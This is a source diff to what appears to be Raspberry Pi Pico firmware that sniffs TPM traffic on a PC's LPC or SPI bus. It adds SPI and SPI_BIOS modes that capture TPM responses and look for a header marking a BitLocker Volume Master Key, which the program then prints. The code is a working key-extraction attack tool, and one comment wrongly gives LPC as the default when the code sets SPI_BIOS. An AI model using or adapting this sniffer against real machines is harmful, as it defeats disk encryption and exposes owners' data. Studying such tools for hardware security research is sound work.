@@ -10,9 +10,19 @@
 
 // Our assembled program:
 #include "lpc_sniffer.pio.h"
-
+#include "spi_sniffer.pio.h"
+#include "spi_bios_sniffer.pio.h"
 
 #include "hardware/flash.h"
+
+enum SNIFF_PROTOCOL {
+	LPC,
+	SPI,
+	SPI_BIOS
+};
+
+// default to LPC sniffing protocol
+enum SNIFF_PROTOCOL sniff_protocol = SPI_BIOS;
 
 unsigned char reverse(unsigned char b) {
    b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
@@ -44,7 +54,30 @@ static inline uint32_t fetch(PIO pio, uint sm) {
     return result;
 }
 
-static inline uint32_t fetch_message(PIO pio, uint sm) {
+static inline char fetch_spi_message(PIO pio, uint sm){
+    char data, data1, data2, data3, data4;
+
+    // looking for the signature 0x80000001 before the 
+    // actual data byte from the TPM chip response (SO)
+    // return the data byte only, skip everything else
+    while (1) {
+	data1 = (char) (pio_sm_get_blocking(pio, sm) );
+	if (data1 != 0x80) continue;
+	data2 = (char) (pio_sm_get_blocking(pio, sm));
+	if (data2 != 0x00) continue;
+	data3 = (char) (pio_sm_get_blocking(pio, sm));
+	if (data3 != 0x00) continue;
+	data4 = (char) (pio_sm_get_blocking(pio, sm));
+	if (data4 != 0x01) continue;
+
+	data = (char) pio_sm_get_blocking(pio,sm);
+	break;
+    }
+    return data;
+}
+
+
+static inline uint32_t fetch_lpc_message(PIO pio, uint sm) {
     while (1) {
         uint32_t result = fetch(pio, sm);
         // Only act on 0b0101 header (TPM comms)
@@ -90,6 +123,7 @@ static inline uint32_t fetch_message(PIO pio, uint sm) {
             }
             
             // i is 1 here, even when result 2 is 0xF0001FFF
+        
             uint8_t data = reverse_nibbles((result2 >> ((i-2)*4)) & 0xFF );
             return address << 8 | data;
         }
@@ -107,19 +141,10 @@ uint32_t buf[MAXCOUNT];
 char message_buffer[4096*2];
 volatile size_t msg_buffer_ptr = 0;
 
-void core1_entry() {
-    // 12 byte header + 32 byte data
-    char msg_buffer[12 + 32];
-    memset(msg_buffer, 0, 44);
-
-    PIO pio = pio0;
-    uint offset = pio_add_program(pio, &lpc_sniffer_program);
-    uint sm = pio_claim_unused_sm(pio, true);
-    lpc_sniffer_program_init(pio, sm, offset, 1, 10);
-    size_t bufpos = 0;
-    
+void fetch_lpc(PIO pio, uint sm)
+{
     while(1) {
-        uint32_t message = fetch_message(pio, sm);
+        uint32_t message = fetch_lpc_message(pio, sm);
         // It's a read of the right address
         if((message & 0x0f00ff00) == 0x00002400) {
             char message_char = message & 0xff;
@@ -132,10 +157,65 @@ void core1_entry() {
     }
 }
 
+void fetch_spi(PIO pio, uint sm)
+{
+    printf("[SPI protocol selection]\n");
+    while(1) {
+        char message = fetch_spi_message(pio, sm);
+	    if (message == 0x2c){
+	        multicore_fifo_push_blocking(msg_buffer_ptr+1);
+	        for (int i = 0; i < 44; i++){
+	    	    message_buffer[msg_buffer_ptr++] = message;
+		        message = fetch_spi_message(pio, sm);
+            }
+	        message_buffer[msg_buffer_ptr++] = message;
+	    }
+	}
+}
+
+void fetch_spi_bios(PIO pio, uint sm)
+{
+    fetch_spi(pio, sm);
+}
+
+void core1_entry() 
+{
+    PIO pio = pio0;
+    uint offset ;
+    uint sm;
+
+    switch (sniff_protocol){
+        case LPC:
+    	    offset = pio_add_program(pio, &lpc_sniffer_program);
+            sm = pio_claim_unused_sm(pio, true);
+            lpc_sniffer_program_init(pio, sm, offset, 1, 10);
+            fetch_lpc(pio, sm);
+	    break;
+	    case SPI:
+	        offset = pio_add_program(pio, &spi_sniffer_program);
+	        sm = pio_claim_unused_sm(pio, true);
+	        spi_sniffer_program_init(pio, sm, offset, 2, 4);
+	        fetch_spi(pio, sm);
+	        break;
+	    case SPI_BIOS:
+	        offset = pio_add_program(pio, &spi_bios_sniffer_program);
+	        sm = pio_claim_unused_sm(pio, true);
+	        spi_bios_sniffer_program_init(pio, sm, offset, 2, 4);
+            fetch_spi_bios(pio, sm);
+	    break;
+	    default:
+	        offset = pio_add_program(pio, &spi_bios_sniffer_program);
+	        sm = pio_claim_unused_sm(pio, true);
+	        spi_bios_sniffer_program_init(pio, sm, offset, 2, 4);
+	        fetch_spi_bios(pio, sm);
+	    break;
+	}
+}
 
 int main() {
     set_sys_clock_khz(270000, true); // 158us
     stdio_init_all();
+    
     sleep_ms(5000);
 
     puts(" _           ");
@@ -151,9 +231,9 @@ int main() {
     puts("");
 
     printf("[+] Ready to sniff!\n");
-
+    
     multicore_launch_core1(core1_entry);
-
+    
     while(1) {
         uint32_t popped = multicore_fifo_pop_blocking();
 
@@ -161,7 +241,8 @@ int main() {
         while((msg_buffer_ptr - popped) < 44) {
         }
         
-        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) {
+        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) 
+        {
             printf("[+] Bitlocker Volume Master Key found:\n");
 
             for(int i=0; i < 2; i++) {
